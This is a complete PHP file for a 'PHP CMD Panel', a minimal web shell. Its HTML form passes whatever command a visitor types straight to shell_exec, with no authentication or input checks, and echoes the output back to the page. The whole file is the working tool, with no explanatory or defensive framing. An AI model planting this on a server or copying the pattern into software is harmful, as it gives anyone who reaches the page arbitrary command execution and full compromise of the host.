<?php
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $cmd = $_POST['cmd'];
        $output = shell_exec($cmd);
        }
        ?>

        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                    <title>PHP CMD Panel</title>
                    </head>
                    <body>
                        <h1>PHP CMD Panel</h1>
                            <form method="post">
                                    <label for="cmd">Command:</label>
                                            <input type="text" name="cmd" id="cmd" required>
                                                    <button type="submit">Execute</button>
                                                        </form>

                                                            <?php if (isset($output)): ?>
                                                                    <h2>Output:</h2>
                                                                            <pre><?php echo htmlspecialchars($output); ?></pre>
                                                                                <?php endif; ?>
                                                                                </body>
                                                                                </html>
